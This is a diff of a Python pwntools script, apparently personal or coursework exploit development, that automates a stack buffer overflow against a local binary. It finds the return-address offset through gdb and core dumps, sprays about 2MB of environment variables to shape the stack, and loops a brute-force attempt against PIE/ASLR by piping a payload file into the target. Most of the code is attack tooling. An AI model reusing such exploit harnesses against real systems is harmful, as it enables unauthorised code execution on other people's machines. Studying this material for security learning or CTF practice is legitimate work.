@@ -9,6 +9,24 @@ from pwn import *
 
 log_file_path = 'strace.log'
 
+env_vars = {
+    "VAR1": "A" * 131000,
+    "VAR2": "B" * 131000,
+    "VAR3": "C" * 131000,
+    "VAR4": "D" * 131000,
+    "VAR5": "E" * 131000,
+    "VAR6": "F" * 131000,
+    "VAR7": "G" * 131000,
+    "VAR8": "H" * 131000,
+    "VAR9": "I" * 131000,
+    "VAR10": "J" * 131000,
+    "VAR11": "K" * 131000,
+    "VAR12": "L" * 131000,
+    "VAR13": "M" * 131000,
+    "VAR14": "N" * 131000,
+    "VAR15": "O" * 131000
+}
+
 
 def cleanup(exit_code: int):
 
@@ -47,7 +65,7 @@ def generate_test():
 def locate_ra(pattern, target):
 
     gdb_proc = subprocess.Popen(
-        [f"gdb {target}"], 
+        [f"gdb -q {target}"], 
         stdin=subprocess.PIPE, 
         stdout=subprocess.PIPE, 
         stderr=subprocess.PIPE, 
@@ -56,7 +74,9 @@ def locate_ra(pattern, target):
     )
 
     #send the pattern to the gdb target proc from both the arguments and stdin 
+    #when I send commands from a script to gdb, 4 whitespaces (0x20202020) are added in the beginning of the buffer and it messes up the ra offset calculation!!!
     commands = f"""
+    set disable-randomization off
     set pagination off
     r {pattern.decode('latin-1')}
     {pattern.decode('latin-1')}
@@ -65,12 +85,20 @@ def locate_ra(pattern, target):
     gdb_proc.stdin.write(commands)
     gdb_proc.stdin.flush()
 
+
     while True:
         output = gdb_proc.stdout.readline()
         if "Program received signal SIGSEGV" in output:
+            print(output)
             break
 
     gdb_proc.stdin.write("info registers\n")
+    gdb_proc.stdin.flush()
+
+    gdb_proc.stdin.write("info frame\n")
+    gdb_proc.stdin.flush()
+
+    gdb_proc.stdin.write("x/40x $esp-160\n")
     gdb_proc.stdin.flush()
 
     gdb_proc.stdin.write("q\n")
@@ -79,8 +107,8 @@ def locate_ra(pattern, target):
 
     output, _ = gdb_proc.communicate()
 
-    print(output)
-    print(pattern)
+    # print(output)
+    # print(pattern)
     
     eip_value = None
     for line in output.splitlines():
@@ -94,6 +122,26 @@ def locate_ra(pattern, target):
     print(f"offset: {offset}")
     return offset
 
+def locate_ra2(pattern, target):
+        
+    crash_proc = process(
+        [target, 
+        pattern.decode('latin-1')]
+    )
+        
+    crash_proc.sendline(pattern.decode('latin-1'))      #sending the crash pattern via stdin for the binaries that consume input from standard input
+
+    if crash_proc.poll(True) != 0:
+        print(f"Process crashed with return code {crash_proc.poll(True)}")
+
+    core = crash_proc.corefile          #problem with core files -> core dumps are piped in a program named apport that handles sensitive data ?? idek
+    if core != None:
+        print(f"eip val after crash: {core.eip}")
+    else:
+        print("No core file found")
+
+        
+    
 
 def target_ra(target):
 
@@ -243,7 +291,7 @@ def main():
         print(f"{target}: Permission denied")
         sys.exit(1)
 
-    # context.log_level='warn'
+    context.log_level='warn'
     # context.log_level = 'debug'
 
     #this program has PIE enabled -> compilation option that changes the location of the executable in every run
@@ -254,13 +302,16 @@ def main():
 
 
     #performing brute force attack
-    exploit_command = f"cat payload - | {target} " + " ".join(["`cat trash`"] * 15)
+    # exploit_command = f"cat payload - | {target} " + " ".join(["`cat trash`"] * 15)
+    exploit_command = f"cat payload - | {target}"
+
     i = 0
     while True:
         print(f"Attempt: {i}")
         i += 1
         
-        exploit_proc = process(exploit_command, shell=True, stdin=PTY, stdout=PTY, stderr=PTY, raw=False)
+        #passing on 2MB of env vars to fill up the stack
+        exploit_proc = process(exploit_command, shell=True, stdin=PTY, stdout=PTY, stderr=PTY, raw=False, env=env_vars)
         exploit_proc.sendline()
         
         try:
